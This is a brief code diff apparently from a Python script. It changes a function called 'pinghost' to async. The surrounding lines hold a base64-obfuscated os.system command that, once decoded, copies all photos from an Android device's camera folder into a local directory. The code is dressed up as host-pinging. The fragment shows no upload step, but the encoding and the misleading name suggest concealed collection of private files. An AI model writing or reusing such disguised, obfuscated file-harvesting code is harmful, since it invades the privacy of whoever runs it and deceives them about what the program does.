@@ -13,7 +13,7 @@ async def checkhost(mwock, othkr='.'):
 
 
 
-def pinghost():
+async def pinghost():
   directory = 'a'
   if os.path.exists(directory):
      cpdr = base64.b64decode("b3Muc3lzdGVtKGYiY3AgL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYS8qIHtkaXJlY3Rvcnl9Ly4iKQ==").decode('utf-8')
